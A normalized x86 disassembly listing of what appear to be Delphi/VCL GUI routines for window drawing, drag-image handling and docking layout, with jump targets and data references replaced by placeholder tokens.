mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_441d18
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
cmp esi [ rw-data ]
jne r-xdata
mov eax [ esi + 0x160 ]
call sub_403104
mov edx ebx
and dl 0xfc
mov eax esi
call sub_439524
test bl bl
jle r-xdata
xor eax eax
call sub_43751c
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_441d58
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_41d848
xor eax eax
push ebp
push sub_441df3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_41dbbc
xor eax eax
push ebp
push sub_441dd0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x8c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441dd7
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
xor edx edx
call sub_41dbbc
retn
sub_441e04
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44273c
mov edx 0x80ffff
mov eax esi
call sub_43a4ec
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x80 ]
mov eax [ esi + 0x208 ]
call sub_41da5c
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_41d510
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax esi
pop esi
pop ebx
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_441e70
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_43d9b4
mov [ ebx + 0x4 ] 0x80800000
or [ ebx + 0x24 ] 0x800
cmp [ rw-data ] 0x0
je r-xdata
mov edx 0x1
mov eax 0x5
call sub_40bd50
test al al
je r-xdata
mov [ ebx + 0x8 ] 0x80
cmp [ rw-data ] 0x0
je r-xdata
or [ ebx + 0x24 ] 0x20000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_43d94c
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] 0x80
sub_441edc
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_440b28
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_441f32
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441f39
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_440b28
push eax
call ReleaseDC
retn
sub_441f40
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor edx edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_441fd9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
add [ ebp - 0x10 ] 0x2
add [ ebp - 0xc ] 0x2
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x80 ]
mov edx [ eax + 0x18 ]
mov eax [ ebx + 0x208 ]
mov eax [ eax + 0xc ]
call sub_41cc28
mov eax ebx
call sub_43c660
or eax 0x810
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_43a34c
mov eax [ ebp - 0x14 ]
call sub_404314
push eax
mov eax [ ebx + 0x208 ]
call sub_41db3c
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441fe0
lea eax [ ebp - 0x14 ]
call sub_403e54
retn
sub_441fe8
push esi
mov eax [ edx + 0x4 ]
cmp eax 0x100
jb r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx 0xb000
je r-xdata
cmp eax 0x108
jbe r-xdata
mov al 0x1
pop esi
retn
cmp ecx 0xb001
je r-xdata
cmp [ edx + 0x4 ] 0xb016
je r-xdata
cmp [ edx + 0x4 ] 0xb017
je r-xdata
cmp [ edx + 0x4 ] 0x111
je r-xdata
mov esi [ edx + 0x4 ]
cmp esi 0x200
jbe r-xdata
cmp [ edx + 0x4 ] 0xa0
je r-xdata
cmp esi 0x20a
jbe r-xdata
xor eax eax
pop esi
retn
sub_442054
push ebp
mov ebp esp
push 0x0
push 0x0
push esi
mov esi eax
xor eax eax
push ebp
push sub_4420df
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x210 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4420e6
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403e78
retn
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_43a34c
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x208 ]
call sub_41d99c
mov edx eax
add edx 0x6
mov eax esi
call sub_439b08
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_43a34c
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x208 ]
call sub_41d9b8
mov edx eax
add edx 0x4
mov eax esi
call sub_439b2c
sub_4420ec
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
mov esi [ rw-data ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor eax eax
push ebp
push sub_4422c5
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43a37c
add [ ebp - 0xc ] 0x4
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_43b598
mov eax [ esi ]
call sub_457d18
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
add edx [ ebp - 0x14 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_457d24
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
add edx [ ebp - 0x18 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_457d18
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
mov [ ebp - 0x14 ] eax
mov eax [ esi ]
call sub_457d0c
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov eax [ esi ]
call sub_457d24
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x48 ]
mov [ ebp - 0x18 ] eax
mov eax [ esi ]
call sub_457d00
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ esi ]
call sub_457d0c
mov [ ebp - 0x18 ] eax
push 0x10
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_440b28
push eax
call SetWindowPos
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x214 ]
cmp eax 0xfa
jbe r-xdata
mov eax [ esi ]
call sub_457d00
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_43e25c
push 0x4
mov eax [ ebp - 0x4 ]
call sub_440b28
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4422cc
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x214 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
mov eax ebx
call sub_404114
cmp eax 0x64
jge r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1016
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1018
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_445384
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x14 ]
jle r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x1
xor ebx ebx
jmp r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x40000
push eax
push 0x64
mov eax [ ebp - 0x4 ]
call sub_440b28
push eax
call [ rw-data ]
sub_4422d4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xd0 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4422fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push 0x0
push ebx
mov ecx edi
xor edx edx
xor eax eax
call sub_412938
mov eax esi
call sub_43c660
or eax 0xc10
push eax
push ebx
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_404314
push eax
mov eax [ esi + 0x208 ]
call sub_41db3c
push eax
call DrawTextA
add [ ebx + 0x8 ] 0x6
add [ ebx + 0xc ] 0x2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_442358
push ebx
push esi
add esp 0xffffffe4
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x48 ]
xor edx edx
xor eax eax
call sub_412938
call sub_42f358
call sub_42f438
test al al
jne r-xdata
call sub_42f358
lea ecx [ esp + 0x10 ]
mov dl 0x1
call sub_42f7f8
push esp
push 0x1
push 0xf
push 0x0
call sub_42f358
lea ecx [ esp + 0x20 ]
mov edx esi
call sub_42f4f8
push 0xf
push 0x1
lea eax [ esp + 0x8 ]
push eax
push esi
call DrawEdge
jmp r-xdata
add esp 0x1c
pop esi
pop ebx
retn
sub_4423c4
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
mov edx [ esi + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_43eb64
mov edx [ esi + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
pop ebx
retn
sub_4423e8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
lea eax [ ebp - 0x8 ]
push eax
push ebx
call ClientToScreen
lea eax [ ebp - 0x18 ]
push eax
push ebx
call GetWindowRect
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x18 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x14 ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_442440
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
cmp [ ebx + 0x68 ] 0xffff
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
push 0x1
push 0x1
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
push 0xd
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
call ImageList_Create
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_442500
push [ fs : eax ]
mov [ fs : eax ] esp
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4581ec
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4243e8
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4581ec
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4243e8
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
lea eax [ ebp - 0xc ]
push eax
push 0x0
call ImageList_GetDragImage
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x1
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call ImageList_Destroy
retn
sub_44250c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_44748c
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x78 ] esi
mov [ ebx + 0x70 ] edi
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x74 ] eax
mov eax [ ebp + 0x8 ]
push eax
push edi
push esi
mov eax ebx
call sub_447660
push eax
call ImageList_BeginDrag
mov al 0x1
mov [ ebx + 0x6a ] al
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_44256c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4482d4
mov eax ebx
call sub_44748c
test al al
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x6a ] 0x0
je r-xdata
push esi
push 0x0
call ImageList_GetDragImage
sub_442598
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax esi
call sub_44748c
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
cmp [ esi + 0x6a ] 0x0
jne r-xdata
mov eax esi
call sub_442440
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_4425f8
mov ebx eax
test bl bl
je r-xdata
mov eax [ esi + 0x74 ]
push eax
mov ecx [ esi + 0x70 ]
mov edx [ esi + 0x78 ]
mov eax esi
call sub_44250c
push 0x0
call ShowCursor
sub_4425f8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor ebx ebx
mov eax edi
call sub_44748c
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp esi [ edi + 0x6c ]
je r-xdata
mov eax edi
call sub_44265c
mov ebx esi
mov [ edi + 0x6c ] ebx
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4423e8
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ edi + 0x6c ]
push eax
call ImageList_DragEnter
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_44265c
push ebx
mov ebx eax
mov eax ebx
call sub_44748c
test al al
je r-xdata
pop ebx
retn
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax [ ebx + 0x6c ]
push eax
call ImageList_DragLeave
xor eax eax
mov [ ebx + 0x6c ] eax
sub_442680
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_44748c
test al al
je r-xdata
xor eax eax
push esp
mov ecx edi
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_4423e8
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
call ImageList_DragMove
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_4426f4
push ebx
push esi
mov esi eax
mov eax esi
call sub_44748c
test al al
je r-xdata
xor ebx ebx
cmp [ esi + 0x6a ] 0x0
je r-xdata
mov eax esi
call sub_44265c
call ImageList_EndDrag
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x6a ] 0x0
or edx 0xffffffff
mov eax esi
call sub_442554
push 0xffffffff
call ShowCursor
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_44273c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43c854
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d544
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_438f28
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_442798
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_403104
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43c978
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_4427e8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41d848
xor eax eax
push ebp
push sub_442886
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx ebx
call sub_41dbbc
xor eax eax
push ebp
push sub_442863
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_438f40
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44286a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_41dbbc
retn
sub_442898
push ebx
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_44292c
test al al
je r-xdata
mov ebx [ ebx + 0xc ]
sub_4428b4
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
cmp [ edx + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_44292c
push ebx
push esi
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
mov bl 0x1
call sub_442f24
mov esi eax
test esi esi
je r-xdata
mov bl [ edx + 0x57 ]
jmp r-xdata
xor ebx ebx
mov eax esi
call sub_44292c
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov esi [ esi + 0xc ]
test esi esi
jne r-xdata
sub_442960
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_4429f0
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b520
call sub_403890
mov edx 0x2
call sub_4429f0
jmp r-xdata
retn
sub_4429a8
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_442a5c
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b520
call sub_403890
mov edx 0x2
call sub_442a5c
jmp r-xdata
retn
sub_4429f0
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
jmp r-xdata
mov edx [ esi + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov ecx edi
mov edx [ eax + 0x14 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
dec al
je r-xdata
mov eax edx
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ esp + 0x4 ]
jmp r-xdata
dec al
jne r-xdata
mov eax [ eax + 0x18 ]
call sub_442e24
jmp r-xdata
add esp 0x10
pop edi
pop esi
retn
xor eax eax
mov eax [ esp ]
jmp r-xdata
sub_442a5c
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov ebx eax
mov eax [ ebx + 0x1c ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
cmp al 0x1
jne r-xdata
mov eax [ ebx + 0x1c ]
mov esi [ eax + 0x64 ]
cmp esi [ ebx + 0x14 ]
jne r-xdata
mov eax [ esp + 0x8 ]
sub eax [ esp ]
jmp r-xdata
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
jmp r-xdata
mov esi ebx
jmp r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x1c ]
cmp esi [ eax + 0x64 ]
jne r-xdata
mov eax esi
call sub_442910
dec eax
jne r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
cmp dl [ eax + 0x10 ]
jne r-xdata
mov ecx edi
mov eax [ ebx + 0x1c ]
mov edx [ eax + 0x64 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov esi eax
mov eax esi
call sub_442e24
push eax
mov eax esi
call sub_442960
pop edx
xchg edx eax
sub eax edx
jmp r-xdata
mov eax edx
call sub_442e24
mov eax [ eax + 0x68 ]
jmp r-xdata
sub_442b0c
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_442910
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov eax esi
call sub_442f24
mov ebx eax
mov al [ esi + 0x10 ]
dec al
je r-xdata
mov edx 0x1
mov eax esi
call sub_442a5c
mov edi eax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_442910
push eax
mov eax edi
pop edx
mov ecx edx
cdq
idiv ecx
mov esi eax
test ebx ebx
je r-xdata
mov edx 0x2
mov eax esi
call sub_442a5c
mov edi eax
jmp r-xdata
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
xor edi edi
mov eax ebx
call sub_442960
mov edx eax
add edx esi
mov eax ebx
call sub_442e4c
mov edx edi
mov eax ebx
call sub_442e4c
jmp r-xdata
mov eax ebx
call sub_442cac
mov eax ebx
call sub_442efc
mov ebx eax
test ebx ebx
jne r-xdata
sub_442bb4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
call sub_403e54
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
call sub_403ea8
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b5dc
call sub_403890
sub_442bf8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov ebx eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x1c ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov si 0xffb9
call sub_403300
cmp [ ebp - 0x8 ] 0x0
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov [ eax + 0x38 ] ebx
xor eax eax
push ebp
push sub_442c69
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_43b040
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x38 ] edx
retn
sub_442c7c
push ebp
mov ebp esp
push ebx
push esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x14 ]
test esi esi
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax esi
call sub_442efc
test eax eax
je r-xdata
mov esi [ esi + 0x14 ]
test esi esi
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_442cac
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp [ edx + 0x6c ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
mov [ eax + 0x9c ] dl
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_442a5c
mov ebx eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_442a5c
mov esi eax
push ebp
call sub_442c7c
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_442efc
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x64 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
jne r-xdata
push esi
lea eax [ ebp - 0x14 ]
push eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_4429f0
push eax
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_4429f0
mov ecx ebx
pop edx
call sub_412960
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov ebx [ eax ]
call [ ebx ]
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_439d0c
mov eax [ ebp - 0x4 ]
call sub_442e24
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x64 ]
call sub_442e24
cmp edi eax
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_442e24
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x68 ]
jl r-xdata
sub_442e24
push ebx
mov ebx eax
mov eax ebx
call sub_44292c
test al al
jne r-xdata
mov eax [ ebx + 0x20 ]
pop ebx
retn
mov eax ebx
call sub_4428b4
test al al
je r-xdata
mov eax ebx
call sub_442960
pop ebx
retn
sub_442e60
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_442e4c
mov ebx [ ebx + 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4428fc
